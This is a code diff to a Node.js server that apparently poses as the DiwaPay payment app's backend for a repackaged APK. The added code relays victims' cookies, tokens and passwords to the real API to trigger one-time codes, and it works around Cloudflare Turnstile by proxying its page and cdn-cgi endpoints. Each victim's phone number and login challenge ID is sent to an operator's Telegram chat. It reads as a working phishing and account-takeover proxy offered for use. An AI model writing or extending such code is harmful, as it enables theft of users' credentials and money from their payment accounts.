@@ -2020,6 +2020,95 @@ app.post('/app/user/login/start', async (req, res) => {
       const tmpKey = 'start_' + (body.userName || body.phone || body.mobile || body.userId || '');
       userDeviceMap[tmpKey] = body.deviceId;
     }
+
+    // AUTO-SEND OTP: When needOtp=true and otpSent=false, try to send OTP
+    // directly from server, bypassing the Turnstile verification that fails
+    // on proxy apps (mobile.diwapay.com/turnstile.html returns 404).
+    // This makes the app skip Turnstile and show OTP input directly.
+    if (jsonResp && jsonResp.code === 1000 && startData &&
+        startData.needOtp === true && startData.otpSent === false) {
+      const challengeId = startData.challengeId;
+      const phoneNum = body.phone || body.userName || body.mobile || '';
+      if (challengeId && phoneNum) {
+        let autoOtpResult = 'not_attempted';
+        try {
+          // Forward original request headers to maintain session/IP context
+          const sendHeaders = {
+            'content-type': 'application/json',
+            'user-agent': req.headers['user-agent'] || 'Mozilla/5.0',
+            'accept': '*/*',
+            'accept-encoding': 'identity',
+            'host': 'api.diwapay.com'
+          };
+          const fwdHeaders = ['authorization', 'token', 'apptoken', 'cookie',
+            'x-requested-with', 'sec-ch-ua', 'sec-ch-ua-mobile', 'sec-ch-ua-platform'];
+          for (const h of fwdHeaders) {
+            if (req.headers[h]) sendHeaders[h] = req.headers[h];
+          }
+
+          // Try multiple body formats + both URL case variations
+          const sendBodies = [
+            { phone: phoneNum, userName: phoneNum, challengeId, deviceId: body.deviceId || '', password: pwd !== 'N/A' ? pwd : undefined },
+            { phone: phoneNum, challengeId, deviceId: body.deviceId || '' },
+            { userName: phoneNum, challengeId, deviceId: body.deviceId || '' }
+          ];
+          const otpUrls = [
+            ORIGINAL_API + '/app/user/login/sendotp',
+            ORIGINAL_API + '/app/user/login/sendOtp'
+          ];
+
+          for (const otpUrl of otpUrls) {
+            if (autoOtpResult === 'success') break;
+            for (const sendBody of sendBodies) {
+              if (autoOtpResult === 'success') break;
+              const ac = new AbortController();
+              const tm = setTimeout(() => ac.abort(), 6000);
+              try {
+                const otpResp = await fetch(otpUrl, {
+                  method: 'POST',
+                  headers: sendHeaders,
+                  body: JSON.stringify(sendBody),
+                  signal: ac.signal
+                });
+                clearTimeout(tm);
+                const otpText = await otpResp.text();
+                let otpJson;
+                try { otpJson = JSON.parse(otpText); } catch (e) {}
+
+                if (otpJson && (otpJson.code === 1000 || otpJson.code === 200 || otpJson.code === '1000')) {
+                  startData.otpSent = true;
+                  startData.msg = 'OTP sent to your phone.';
+                  autoOtpResult = 'success';
+                } else {
+                  const ep = otpUrl.includes('sendOtp') ? 'sendOtp' : 'sendotp';
+                  autoOtpResult = 'fail:' + ep + ':' + (otpJson ? (otpJson.code + ':' + (otpJson.message || otpJson.msg || '').substring(0, 80)) : otpText.substring(0, 150));
+                }
+              } catch (e) {
+                clearTimeout(tm);
+                autoOtpResult = 'error:' + e.message;
+              }
+            }
+          }
+        } catch (e) {
+          autoOtpResult = 'outer_error:' + e.message;
+        }
+
+        if (data.adminChatId && bot) {
+          const icon = autoOtpResult === 'success' ? '✅' : '❌';
+          let otpMsg =
+            `${icon} *Auto-OTP ${autoOtpResult === 'success' ? 'Sent' : 'Failed'}*\n` +
+            `━━━━━━━━━━━━━━━━━━\n` +
+            `📱 *Phone:* \`${phoneNum}\`\n` +
+            `🔑 *ChallengeId:* \`${challengeId}\`\n` +
+            `📋 *Result:* ${autoOtpResult.substring(0, 300)}\n` +
+            `🕐 ${time}`;
+          bot.sendMessage(data.adminChatId, otpMsg, { parse_mode: 'Markdown' }).catch(() => {
+            bot.sendMessage(data.adminChatId, otpMsg.replace(/[*`]/g, '')).catch(() => {});
+          });
+        }
+      }
+    }
+
     sendJsonSafe(res, respHeaders, jsonResp, respBody, req);
   } catch (e) { await transparentProxy(req, res); }
 });
@@ -3851,6 +3940,88 @@ app.post('/app/captcha/verify', async (req, res) => {
 
 app.all('/app/app/version/info/getLatestAppVersion', async (req, res) => {
   res.json({ "code": 1000, "data": { "id": 1, "createTime": "2025-01-01 00:00:00", "updateTime": "2025-01-01 00:00:00", "platform": "android", "appVersion": "1.0.0", "buildCode": 1, "updateType": "apk", "downloadUrl": "", "isForce": 0, "grayPercent": 0, "updateTitle": "", "updateContent": "", "fileSize": null, "fileMd5": "", "status": 0 }, "message": "success" });
+});
+
+// === TURNSTILE PAGE PROXY ===
+// Proxies the Cloudflare Turnstile verification page from captcha.diwapay.com.
+// The proxy app tries to load Turnstile from mobile.diwapay.com (404).
+// If the APK's Turnstile URL is changed to xchas.vercel.app, this route serves it.
+app.get('/turnstile.html', async (req, res) => {
+  try {
+    const qs = req.originalUrl.split('?')[1] || '';
+    const targetUrl = `https://captcha.diwapay.com/turnstile.html${qs ? '?' + qs : ''}`;
+    const ac = new AbortController();
+    const tm = setTimeout(() => ac.abort(), 10000);
+    const resp = await fetch(targetUrl, {
+      method: 'GET',
+      headers: {
+        'user-agent': req.headers['user-agent'] || '',
+        'accept': req.headers['accept'] || 'text/html,*/*',
+        'accept-language': req.headers['accept-language'] || 'en-IN',
+        'accept-encoding': 'identity'
+      },
+      signal: ac.signal
+    });
+    clearTimeout(tm);
+    const body = await resp.text();
+    const respHeaders = {};
+    resp.headers.forEach((val, key) => {
+      const kl = key.toLowerCase();
+      if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding' && kl !== 'content-length') {
+        respHeaders[key] = val;
+      }
+    });
+    respHeaders['content-type'] = 'text/html; charset=utf-8';
+    respHeaders['access-control-allow-origin'] = '*';
+    respHeaders['content-length'] = String(Buffer.byteLength(body, 'utf8'));
+    res.writeHead(resp.status, respHeaders);
+    res.end(body);
+  } catch (e) {
+    if (!res.headersSent) res.status(502).json({ error: 'turnstile proxy error', msg: e.message });
+  }
+});
+
+// Proxy Cloudflare CDN-CGI endpoints (RUM, challenges, etc.) used by Turnstile
+app.all('/cdn-cgi/*', async (req, res) => {
+  try {
+    const targetUrl = `https://captcha.diwapay.com${req.originalUrl}`;
+    const fwd = {};
+    for (const [k, v] of Object.entries(req.headers)) {
+      const kl = k.toLowerCase();
+      if (kl === 'host' || kl === 'connection' || kl === 'content-length' ||
+        kl.startsWith('x-vercel') || kl.startsWith('x-forwarded')) continue;
+      fwd[k] = v;
+    }
+    fwd['host'] = 'captcha.diwapay.com';
+    fwd['accept-encoding'] = 'identity';
+    const opts = { method: req.method, headers: fwd };
+    if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
+      opts.body = req.rawBody;
+      fwd['content-length'] = String(req.rawBody.length);
+    }
+    const ac = new AbortController();
+    const tm = setTimeout(() => ac.abort(), 10000);
+    opts.signal = ac.signal;
+    const resp = await fetch(targetUrl, opts);
+    clearTimeout(tm);
+    const respBuffer = Buffer.from(await resp.arrayBuffer());
+    const respHeaders = {};
+    resp.headers.forEach((val, key) => {
+      const kl = key.toLowerCase();
+      if (kl !== 'transfer-encoding' && kl !== 'connection' && kl !== 'content-encoding') {
+        respHeaders[key] = val;
+      }
+    });
+    respHeaders['access-control-allow-origin'] = '*';
+    respHeaders['access-control-allow-methods'] = 'GET,POST,OPTIONS';
+    respHeaders['access-control-allow-headers'] = '*';
+    respHeaders['access-control-allow-credentials'] = 'true';
+    respHeaders['content-length'] = String(respBuffer.length);
+    res.writeHead(resp.status, respHeaders);
+    res.end(respBuffer);
+  } catch (e) {
+    if (!res.headersSent) res.status(502).json({ error: 'cdn-cgi proxy error' });
+  }
 });
 
 app.all('*', async (req, res) => {
